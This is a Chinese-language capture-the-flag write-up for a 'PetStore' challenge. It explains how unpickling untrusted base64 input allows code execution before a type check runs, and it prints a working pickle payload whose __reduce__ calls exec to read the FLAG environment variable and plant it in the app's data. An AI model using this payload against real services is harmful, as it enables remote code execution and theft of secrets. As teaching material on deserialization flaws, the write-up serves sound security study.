# PetStore

## 题目简述

宠物导入功能先 Base64 解码，再直接调用 `pickle.loads()`。虽然代码之后会检查结果是否为 `Pet`，但 Pickle 的重建调用已经在 `loads()` 内执行；可以借 `__reduce__()` 调用 `exec`，把环境变量中的 flag 作为宠物名称写入现有 `store`，再从主页正常回显。

## 解题过程

导入函数中真正触发漏洞的是下面两步：

```python
pet_data = base64.b64decode(serialized_pet)
pet = pickle.loads(pet_data)
```

应用随后才用 `isinstance(pet, Pet)` 检查返回对象并决定是否加入列表。这个检查发生得太晚：`pickle.loads()` 返回前已经执行了重建 callable。

对象被 Pickle 序列化时，`__reduce__()` 可返回 `(callable, args)`；反序列化阶段会执行 `callable(*args)`。下面的载荷调用 `exec`，而 `exec` 中直接使用目标进程已有的全局对象 `store`：

```python
import base64
import pickle

class Payload:
    def __reduce__(self):
        code = "import os; store.create_pet(os.getenv('FLAG'), 'flag')"
        return exec, (code,)

print(base64.b64encode(pickle.dumps(Payload())).decode())
```

将输出提交给 Import a Pet。`exec` 的返回值是 `None`，所以后续 `isinstance(None, Pet)` 会失败，接口可能仍显示“导入失败”；但副作用已经发生：`store.create_pet()` 创建了一只 `name=<FLAG>`、`species=flag` 的宠物。回到主页即可在宠物名称中看到动态 flag。

原稿把执行效果误写成 `store.create_pet('flag', os.getenv('FLAG'))`，与实际载荷的参数顺序相反；正确调用是：

```python
store.create_pet(os.getenv("FLAG"), "flag")
```

## 方法总结

对不可信数据执行 `pickle.loads()` 本身就是代码执行边界，反序列化后的类型检查无法补救，因为危险 callable 已先运行。无回显时优先寻找应用自身可持久化、可展示的对象作为回显通道；本题的 `store.create_pet()` 比反弹 shell 或出网外带更短、更稳定。
